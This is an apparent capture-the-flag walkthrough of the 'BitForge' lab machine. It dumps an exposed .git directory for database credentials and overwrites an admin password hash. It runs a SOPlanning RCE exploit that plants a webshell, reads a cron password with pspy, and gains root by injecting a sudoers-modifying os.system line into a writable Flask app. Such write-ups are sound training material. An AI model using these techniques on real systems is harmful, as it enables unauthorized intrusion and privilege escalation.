##### Tags: `sudo-l`  `flask`  `pspy32s`  `mysql`  `.git`

# 🐧BitForge🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.215.186

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http       Apache httpd
3306/tcp open   mysql      MySQL 8.0.40-0ubuntu0.24.04.1
9000/tcp closed cslistener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 3306 running mysql but no credential  
port 80 is running a web server  
run gobuster and found the .git directory
```console
$ gobuster dir -u http://bitforge.lab -w /usr/share/wordlists/dirb/common.txt -x php,txt,html  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bitforge.lab
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 21]
```
use git-dumper to dump all files inside .git  
https://github.com/arthaud/git-dumper
```console
python3 git_dumper.py http://bitforge.lab/.git/ dir
```
and check the log file
```console
$ git log                 
commit 1ce700a508aec3d5e4d4aa1b128a662f2c85f5ad (HEAD -> main)
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:44:48 2024 +0000

    created .env to store the database configuration

commit eaf6c81951775e4202e40762b3300cc936cf4df1
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:44:05 2024 +0000

    removing db-config due to hard coded credentials

commit 18833b811e967ab8bec631344a6809aa4af59480
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:43:08 2024 +0000

    added the database configuration

commit f4f6de69896baa2ecbb1084e604be81343833bfa
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:41:54 2024 +0000

    setting up login and index page for the BitForge website
                                                                  
```
one of the hash reveal the sql credential
```console
$ git show eaf6c81951775e4202e40762b3300cc936cf4df1  
commit eaf6c81951775e4202e40762b3300cc936cf4df1
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:44:05 2024 +0000

    removing db-config due to hard coded credentials

diff --git a/db-config.php b/db-config.php
deleted file mode 100644
index c1d2b96..0000000
--- a/db-config.php
+++ /dev/null
@@ -1,19 +0,0 @@
-<?php
-// Database configuration
-$dbHost = 'localhost'; // Change if your database is hosted elsewhere
-$dbName = 'bitforge_customer_db';
-$username = 'BitForgeAdmin';
-$password = 'B1tForG3S0ftw4r3S0lutions';
```
use credential to login to mysql  
```console
$ mysql -u BitForgeAdmin -p -h 192.168.215.186 --skip-ssl-verify-server-cert
Enter password: B1tForG3S0ftw4r3S0lutions
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 708
Server version: 8.0.40-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+----------------------+
| Database             |
+----------------------+
| bitforge_customer_db |
| information_schema   |
| performance_schema   |
| soplanning           |
+----------------------+
```
```console
MySQL [bitforge_customer_db]> use soplanning
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [soplanning]> show tables;
+----------------------------+
| Tables_in_soplanning       |
+----------------------------+
| planning_audit             |
| planning_config            |
| planning_ferie             |
| planning_groupe            |
| planning_lieu              |
| planning_periode           |
| planning_projet            |
| planning_projet_user_tarif |
| planning_ressource         |
| planning_right_on_user     |
| planning_status            |
| planning_user              |
| planning_user_groupe       |
+----------------------------+
```
found the admin hashes is planning_user table
```console
MySQL [soplanning]> select * from planning_user;
ADM       |           NULL | admin         | admin | 77ba9273d4bcfa9387ae8652377f4c189e5a47ee
```
try to crack it with john but no luck  
after a bit of research, found the structure of .git  
https://github.com/Worteks/soplanning  
the default credential is admin admin and the admin hash is
```console
df5b909019c9b1659e86e0d6bf8da81d6fa3499e
```
we can update the sql admin hash to the default admin hash
```console
MySQL [soplanning]> UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
Query OK, 1 row affected (0.109 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```
we know there is a login page for http://plan.bitforge.lab/www/  
use admin admin now and logged in successful  
the page is running Simple Online Planning v1.52.01  
search and found the RCE
```console
$ python3 52082.py -t http://plan.bitforge.lab/www/ -u admin -p admin

[+] Uploaded ===> File 'gek.php' was added to the task !
[+] Exploit completed.
Access webshell here: http://plan.bitforge.lab/www//upload/files/k53mq8/gek.php?cmd=<command>
Do you want an interactive shell? (yes/no) yes

soplaning:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation
upload pspy32s and found there is a password reveal in the corn job
```console
www-data@BitForge:/tmp$ ./pspy32s
./pspy32s
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
2026/02/22 06:21:01 CMD: UID=0     PID=34429  | /usr/sbin/CRON -f -P 
2026/02/22 06:21:01 CMD: UID=0     PID=34430  | /usr/sbin/CRON -f -P 
2026/02/22 06:21:01 CMD: UID=0     PID=34431  | mysqldump -u jack -pj4cKF0rg3@445 soplanning 
2026/02/22 06:22:01 CMD: UID=0     PID=34432  | /usr/sbin/CRON -f -P 
2026/02/22 06:22:01 CMD: UID=0     PID=34433  | /usr/sbin/CRON -f -P 
2026/02/22 06:22:01 CMD: UID=0     PID=34434  | /bin/sh -c mysqldump -u jack -p'j4cKF0rg3@445' soplanning >> /opt/backup/soplanning_dump.log 2>&1 
2026/02/22 06:22:07 CMD: UID=0     PID=34435  | 
2026/02/22 06:23:01 CMD: UID=0     PID=34436  | /usr/sbin/CRON -f -P 
2026/02/22 06:23:01 CMD: UID=0     PID=34437  | /usr/sbin/CRON -f -P 
2026/02/22 06:23:01 CMD: UID=0     PID=34438  | mysqldump -u jack -pj4cKF0rg3@445 soplanning
```
use that to log into ssh  
```console
$ ssh jack@192.168.215.186
jack@192.168.215.186's password: j4cKF0rg3@445

jack@BitForge:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
```
jack can run flask_password_changer with root shell
```consle
jack@BitForge:~$ sudo -l
Matching Defaults entries for jack on bitforge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer
```
what is does is running the script inside /opt/password_change_app
```console
jack@BitForge:~$ cat /usr/bin/flask_password_changer
#!/bin/bash
cd /opt/password_change_app 
/usr/local/bin/flask run --host 127.0.0.1 --port 9000 --no-debug
```
```console
jack@BitForge:/opt/password_change_app$ cat app.py
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")
```
since we own the file and we can put malicious code in to app.py and execute as root
```console
jack@BitForge:~$ ls -la /opt/password_change_app
drwxr-xr-x 4 jack jack 4096 Feb 22 06:57 .
drwxr-xr-x 4 root root 4096 Jan 16  2025 ..
-rw-r--r-- 1 jack jack  261 Feb 22 06:57 app.py
```
add jack to sudoers
```console
jack@BitForge:/opt/password_change_app$ cat app.py
import os
os.system('echo "jack ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
```
run the command and become root
```console
jack@BitForge:/opt/password_change_app$ sudo /usr/bin/flask_password_changer
Usage: flask run [OPTIONS]
Try 'flask run --help' for help.

Error: Failed to find Flask application or factory in module 'app'. Use 'app:name' to specify one.
jack@BitForge:/opt/password_change_app$ sudo -i
root@BitForge:~# id
uid=0(root) gid=0(root) groups=0(root)
```
